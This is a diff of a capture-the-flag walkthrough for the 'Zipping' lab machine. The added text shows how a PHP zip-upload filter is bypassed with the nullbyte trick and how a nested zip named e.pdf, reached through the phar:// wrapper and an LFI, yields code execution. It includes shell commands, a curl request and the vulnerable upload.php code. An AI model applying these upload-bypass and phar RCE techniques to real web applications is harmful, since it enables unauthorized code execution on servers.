@@ -58,7 +58,7 @@ The upload page states that it allows us to upload zip files containing a single
 
 Trying to bypass the file extension filtering with a nullbyte does not work.
 
-Side note - This worked when the box was first released, but was patched shortly after. To practice we can host the old upload.php locally and practice the nullbyte bypass.
+Side note - This worked when the box was first released, but was patched shortly after. Though as i later learned, it turns out that the patch can also be bypassed. To practice, we can host the old upload.php locally and practice the nullbyte bypass.
 
 Revert the upload.php file using a diff:
 
@@ -99,13 +99,46 @@ The zip uploads successfully:
 
 ![uploaded successfully](Assets/upload_successfull.jpg)
 
-the link doesn't work but removing the pdf extensions allows us to run php code:
+the link doesn't work but removing the pdf extension allows us to run php code:
 
 ![broken link because of the nullbyte](Assets/broken_nullbyte_link.jpg)
 
 ![working link cause of nullbyte](Assets/working_link_cause_nullbyte.jpg)
 
-Since the nullbytes trick doesn't work on the live version what else can we do? The check seems to be only based on the file extension, given an lfi, we could upload a php file with the pdf extension and run it but we haven't found an lfi yet. Another interesting thing to upload would be a symlink:
+It's also possible to exploit this on the newer version. Going to the provided link even after removing the pdf will now not work as it will fail the file exists check because the extension was dropped:
+
+```php
+// Create an md5 hash of the zip file
+$fileHash = md5_file($zipFile);
+// Create a new directory for the extracted files
+$uploadDir = "uploads/$fileHash/";
+$tmpDir = sys_get_temp_dir();
+// Extract the files from the zip
+$zip = new ZipArchive;
+if ($zip->open($zipFile) === true) {
+  if ($zip->count() > 1) {
+  echo '<p>Please include a single PDF file in the archive.<p>';
+  } else {
+  // Get the name of the compressed file
+  $fileName = $zip->getNameIndex(0);
+  if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
+    $uploadPath = $tmpDir.'/'.$uploadDir;
+    echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
+    if (file_exists($uploadPath.$fileName)) {
+      mkdir($uploadDir);
+      rename($uploadPath.$fileName, $uploadDir.$fileName);
+    }
+    echo '<p>File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:</p><a href="'.$uploadDir.$fileName.'">'.$uploadDir.$fileName.'</a>'.'</p>';
+  } else {
+    echo "<p>The unzipped file must have  a .pdf extension.</p>";
+  }
+ }
+}
+```
+
+The file was still created in `$uploadPath` though, and on linux sys_get_temp_dir() usually resolves to `/tmp`. Problem is that `/tmp` is not acessible from the webroot.
+
+So what else can we do? The check seems to be only based on the file extension, given an lfi, we could upload a php file with the pdf extension or use the nullbyte trick to put a file in `/tmp` and run it but we haven't found an lfi yet. Another interesting thing to upload would be a symlink:
 
 ![Symlink upload from burpsuite](Assets/symlink_upload.jpg)
 
@@ -518,6 +551,27 @@ and we get a nice shell!
 ```bash
 rektsu@zipping:/var/www/html/shop$
 ```
+
+Another way of getting to a shell as rektsu that i've learned after solving the box is to use the phar php wrapper to execute a file out of a zip. Since the application only checks for the extesion of the file contained in the main zip we can create a zip contaning another zip archive called e.pdf which contains the actual file with php code.
+
+```bash
+$ echo -n "<?php phpinfo();?>" > "sh.php"
+$ zip e.zip sh.php
+  adding: sh.php (stored 0%)
+$ mv e.zip e.pdf
+$ zip pwn.zip e.pdf
+  adding: e.pdf (deflated 37%)
+```
+
+now after uploading pwn.zip we can use a phar wrapper to execute the php payload like so (note the LFI appends `.php` to the included file):
+
+```bash
+curl 'http://127.0.0.1:8000/shop/index.php?page=phar://../uploads/abc3364b5e4232c09742daa9099baefb/e.pdf/sh'
+```
+
+![Rce through phar php filter using nested zip archives. Image shows php info.](Assets/rce_through_phar_filter_with_nested_zip_upload.png)
+
+As you can see this also works with php8.2.18
 
 Before manual enumeration let's run linpeas in the background.
 
